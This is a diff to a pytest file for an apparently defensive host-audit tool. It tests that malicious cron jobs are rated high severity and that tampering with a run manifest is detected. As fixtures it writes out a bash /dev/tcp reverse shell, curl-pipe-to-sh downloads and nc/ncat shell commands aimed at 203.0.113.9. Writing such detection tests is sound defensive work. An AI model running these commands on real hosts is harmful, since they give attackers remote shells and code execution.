@@ -8,18 +8,25 @@ PowerShell sources statically (no PowerShell is needed here; CI also runs the re
 
 from __future__ import annotations
 
+import hashlib
+import json
+import os
 import re
 import shutil
 import stat
+import subprocess
 import sys
 from collections.abc import Callable
 from pathlib import Path
 from typing import Any
 
 import pytest
+from jsonschema import Draft202012Validator
 from test_linux_baseline_e2e import BASH, FIXTURES, ROOT, _audit, _diff, _make_bin
 
 from shared.reporting.detection import SSH_KEY_PREFIXES, detect
+from shared.reporting.inventory import ReportError, load_snapshot
+from shared.reporting.manifest import verify_run_dir
 
 pytestmark = pytest.mark.skipif(
     BASH is None or sys.platform.startswith("win"), reason="requires bash on a POSIX host"
@@ -177,18 +184,37 @@ def _cron(line: str) -> Callable[[Path], None]:
     return mutate
 
 
-def test_reverse_shell_cron_job_surfaces_the_audit_finding_through_the_real_collector(
+def test_reverse_shell_cron_job_is_high_through_the_real_collector(
     audit: Callable[..., dict[str, Any]],
 ) -> None:
-    """The inventory rules rate a new cron line medium; the audit's PER-CRON-002 says high."""
+    """Command-content analysis rates the job itself high (it was medium before BO-EXE-002), so
+    the equally severe PER-CRON-002 finding is absorbed instead of repeated."""
     doc = _detect(audit(), audit(_cron("* * * * * root bash -i >& /dev/tcp/203.0.113.9/9001 0>&1")))
     job = next(
         d for d in doc["detections"] if d["subject"]["key"].startswith("cron:/etc/cron.d/sysupd")
     )
-    fnd = _by_key(doc, "finding:PER-CRON-002")
-    assert job["severity"] == "medium"
-    assert fnd is not None and fnd["severity"] == "high"
-    assert fnd["id"] in {c["id"] for c in job["correlated"]}
+    assert job["severity"] == "high"
+    assert {r["rule"] for r in job["reasons"]} >= {"BO-SCH-001", "BO-EXE-002"}
+    assert _by_key(doc, "finding:PER-CRON-002") is None
+
+
+@pytest.mark.parametrize(
+    "line",
+    [
+        "* * * * * root curl -s http://203.0.113.9/a.sh | sh",
+        "* * * * * root ncat --exec /bin/sh 203.0.113.9 9001",
+        "* * * * * root nc 203.0.113.9 4444 | /bin/sh",
+        "* * * * * root bash <(curl -s http://203.0.113.9/a)",
+    ],
+)
+def test_cron_attack_commands_are_high_through_the_real_collector(
+    audit: Callable[..., dict[str, Any]], line: str
+) -> None:
+    doc = _detect(audit(), audit(_cron(line)))
+    job = next(
+        d for d in doc["detections"] if d["subject"]["key"].startswith("cron:/etc/cron.d/sysupd")
+    )
+    assert job["severity"] == "high" and "BO-EXE-002" in {r["rule"] for r in job["reasons"]}
 
 
 def test_benign_cron_job_does_not_promote_a_finding(audit: Callable[..., dict[str, Any]]) -> None:
@@ -221,3 +247,60 @@ def test_windows_collectors_emit_the_shapes_the_rules_read() -> None:
         assert setting in sec
     # BO-CFG-006: config:security:defender-exclusion:...
     assert "config:security:defender-exclusion:" in sec
+
+
+# ------------------------------------------------ run manifest from the real collector
+
+
+def _collector_run_dir(workdir: Path, name: str) -> Path:
+    root = _root(workdir / name, "2")
+    bindir = _bindir(workdir / f"{name}-bin")
+    out = workdir / f"{name}-out"
+    env = {
+        **os.environ,
+        "BO_TEST_MODE": "1",
+        "BO_ROOT": str(root),
+        "BO_FORCE_MISSING_TOOLS": "ip route ifconfig netstat systemd-detect-virt",
+        "PATH": f"{bindir}{os.pathsep}{os.environ['PATH']}",
+    }
+    proc = subprocess.run(  # noqa: S603
+        [
+            BASH,
+            str(ROOT / "linux/audit/audit-linux.sh"),
+            "--modules",
+            "system",
+            "--output-dir",
+            str(out),
+        ],
+        capture_output=True,
+        text=True,
+        env=env,
+        check=False,
+        timeout=180,
+    )
+    assert proc.returncode in (0, 4, 6), proc.stderr
+    assert "Manifest SHA-256:" in proc.stderr
+    return next(out.iterdir())
+
+
+def test_real_collector_manifest_matches_the_schema_and_verifies(workdir: Path) -> None:
+    schema = json.loads((ROOT / "shared/schemas/run-manifest.schema.json").read_text("utf-8"))
+    rd = _collector_run_dir(workdir, "manifest-ok")
+    manifest = json.loads((rd / "manifest.json").read_text("utf-8"))
+    Draft202012Validator(schema).validate(manifest)
+    assert manifest["host"]["test_mode"] is True
+    assert verify_run_dir(rd) == []
+    assert load_snapshot(rd).meta.run_id == manifest["run"]["id"]
+    assert (rd / "manifest.json").stat().st_mode & 0o777 == 0o600
+
+
+def test_tampering_with_a_real_run_directory_is_refused(workdir: Path) -> None:
+    rd = _collector_run_dir(workdir, "manifest-tamper")
+    digest = hashlib.sha256((rd / "manifest.json").read_bytes()).hexdigest()
+    assert verify_run_dir(rd, digest) == []
+    report = json.loads((rd / "report.json").read_text("utf-8"))
+    report["findings"] = []
+    (rd / "report.json").write_text(json.dumps(report), encoding="utf-8")
+    assert any("report.json" in p for p in verify_run_dir(rd, digest))
+    with pytest.raises(ReportError, match="manifest verification"):
+        load_snapshot(rd)
